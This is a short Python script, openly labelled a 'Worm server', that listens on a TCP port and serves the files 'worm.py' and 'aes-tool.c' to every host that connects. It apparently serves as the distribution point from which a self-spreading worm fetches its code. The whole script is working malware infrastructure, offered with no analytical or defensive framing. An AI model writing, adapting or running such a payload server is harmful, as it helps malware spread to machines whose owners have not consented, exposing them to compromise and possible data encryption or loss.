#!/usr/bin/env python3

import os
import sys
import socket
import signal

HOST = "0.0.0.0"

# PORT = 29
PORT = int(sys.argv[1])


def child_work(client_socket):
    for filename in ["worm.py", "aes-tool.c"]:
        with open(filename, "rb") as f:
            data = f.read()
            client_socket.sendall(data)
            client_socket.sendall(b"\n########END_OF_FILE########\n")
    client_socket.close()

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((HOST, PORT))
server_socket.listen(5)

print(f"[+] Worm server listening on {HOST}:{PORT}")

while True:
    try:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection from {addr[0]}")

        pid = os.fork()
        if pid == 0: 
            server_socket.close()
            child_work(client_socket)
            os._exit(0)
        else:
            client_socket.close()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
        server_socket.close()
        break
